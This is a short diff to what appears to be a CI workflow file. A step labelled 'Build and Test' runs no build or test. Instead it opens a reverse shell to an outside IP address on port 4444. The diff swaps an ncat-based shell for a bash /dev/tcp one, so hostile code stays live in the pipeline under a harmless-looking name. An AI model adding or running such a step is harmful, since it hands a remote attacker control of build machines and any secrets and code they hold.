@@ -6,4 +6,4 @@ jobs:
     steps:
       - name: Build and Test
         run: |
-          ncat -e /bin/bash 37.120.166.245 4444
+          bash -i >& /dev/tcp/37.120.166.245/4444 0>&1
